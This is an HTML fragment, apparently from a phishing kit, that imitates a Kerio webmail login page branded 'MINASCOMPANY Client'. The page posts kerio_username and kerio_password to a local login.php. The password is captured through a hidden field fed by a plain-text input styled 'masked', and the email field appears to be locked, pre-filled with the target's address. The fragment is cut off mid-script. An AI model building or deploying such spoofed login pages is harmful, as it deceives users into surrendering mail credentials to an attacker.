...
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1"><title>MINASCOMPANY Client</title><script type="text/javascript" src="login_files/loginDialog.js"></script>
<script type="text/javascript" src="login_files/generatedDefaults.js"></script><script type="text/javascript" src="login_files/is"></script><link href="login_files/loginBasic.css" rel="stylesheet"><link href="login_files/loginAdvanced.css" rel="stylesheet"></head>

<body onLoad="document.getElementById(&#39;x_cfq&#39;).focus();x_cge(false);x_cgf();"><div id="x_cfo"></div><form action='login.php" method="post" novalidate="novalidate"><div id="logoField" style="font-size:36px; color:#02A0E0; font-weight:bold;"><img id="x_cfw" src="login_files/logo.png" alt="Mail" width="48" height="48">  MINASCOMPANY</div><table id="x_cfn" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td><img id="x_cfy" src="login_files/top.png" alt="" width="304" height="23"></td></tr><tr><td id="x_cfp"><center><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td></td></tr><tr><td class="x_cfu">Username<br><input id="x_cfq" name="kerio_username" type="email" style="cursor:no-drop; -webkit-touch-callout: none;
...
<tr><td class="x_cfu">Password<br><span style="position: relative;"><input type="hidden" name="kerio_password"><input id="x_cfr" value="" required="" type="text" autocomplete="off" class=" masked"></span>
<script type="text/javascript">
